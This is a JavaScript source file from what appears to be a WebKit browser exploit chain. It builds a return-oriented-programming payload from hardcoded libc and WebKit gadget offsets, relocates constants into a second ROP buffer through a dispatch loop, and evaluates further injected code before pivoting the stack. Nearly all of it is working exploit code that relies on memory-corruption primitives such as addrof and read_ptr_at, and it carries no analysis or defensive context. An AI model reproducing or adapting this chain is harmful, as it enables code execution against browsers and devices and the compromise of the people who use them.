var ropchain_array = new Uint32Array(108);
var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);
var ropchain_offset = 2;
function set_gadget(val)
{
    ropchain_array[ropchain_offset++] = val | 0;
    ropchain_array[ropchain_offset++] = (val / 4294967296) | 0;
}
function set_gadgets(l)
{
    for(var i = 0; i < l.length; i++)
        set_gadget(l[i]);
}
function db(data)
{
    for(var i = 0; i < data.length; i++)
        ropchain_array[ropchain_offset++] = data[i];
}
var ropchain1 = read_ptr_at(addrof(ropbuf)+16);
var ropchain1_end = ropchain1 + ropbuf.buffer.byteLength;
var consts_arr = new Uint32Array(ropconsts.length*2);
eval.call(window, js_pre);
for(var i = 0; i < ropconsts.length; i++)
{
    var val = (function(){ var ropchain = ropchain1; return eval(ropconsts[i]); })();
    consts_arr[2*i] = val;
    consts_arr[2*i+1] = (val - val % 0x100000000) / 0x100000000;
}
var consts_start = read_ptr_at(addrof(consts_arr)+16);
ropchain_offset = 2;
set_gadgets([
libc_base+757614, //pop rcx
ropchain+408, //rdi_bak
libc_base+532458, //mov [rcx], rdi
//loop:
libc_base+155394, //pop rdi
//read_p:
ropchain1,
libc_base+757614, //pop rcx
ropchain1_end,
webkit_base+21328810, //cmp rcx, rdi ; cmovne rax, rcx
libc_base+201468, //sete al
libc_base+227029, //movzx eax, al
webkit_base+4571187, //shl rax, 3
libc_base+757614, //pop rcx
ropchain+304, //dispatch_table+0x90
webkit_base+24344226, //mov rax, [rax + rcx - 0x90]
libc_base+362222, //pop rsi
ropchain+136, //dispatch-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+766440 //pop rsp
]);
//dispatch:
db([0, 0]); // 0x0
//dispatch_table:
set_gadgets([
ropchain+176, //loop_continue
ropchain+400, //loop_break
//loop_continue:
libc_base+226017, //mov rax, [rdi]
webkit_base+4571187, //shl rax, 3
libc_base+757614, //pop rcx
consts_start + 0x90,
webkit_base+24344226, //mov rax, [rax + rcx - 0x90]
libc_base+362222, //pop rsi
ropchain+264, //offset-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614 //pop rcx
]);
//offset:
db([0, 0]); // 0x0
set_gadgets([
libc_base+753071, //add rax, rcx
webkit_base+12671175, //add rdi, rsi
libc_base+757614, //pop rcx
ropchain+40, //read_p
libc_base+532458, //mov [rcx], rdi
libc_base+155394, //pop rdi
//write_p:
ropchain1,
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+757614, //pop rcx
ropchain+336, //write_p
libc_base+532458, //mov [rcx], rdi
libc_base+766440, //pop rsp
ropchain+32, //loop
//loop_break:
libc_base+155394 //pop rdi
]);
//rdi_bak:
db([0, 0]); // 0x0
set_gadgets([
libc_base+766440, //pop rsp
ropchain1
]);
eval.call(window, js_code);
if(0) //hack to skip autopivot
pivot(ropchain);
